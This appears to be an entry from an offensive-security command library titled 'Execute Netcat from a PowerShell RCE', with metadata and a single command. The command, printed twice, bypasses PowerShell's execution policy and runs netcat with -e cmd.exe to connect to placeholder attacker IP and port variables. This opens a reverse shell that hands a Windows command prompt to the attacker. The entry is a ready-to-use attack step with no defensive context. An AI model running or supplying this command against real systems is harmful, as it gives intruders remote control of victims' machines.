---
id: 8fc4d208-ad20-4f17-9853-c55065758f1d
name: Execute Netcat from a PowerShell RCE
type: command
executor: bash
data: powershell -ep bypass cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
output: null
created_at: '2019-12-05T22:28:02.926393+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Execute Netcat from a PowerShell RCE

```bash
powershell -ep bypass cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```
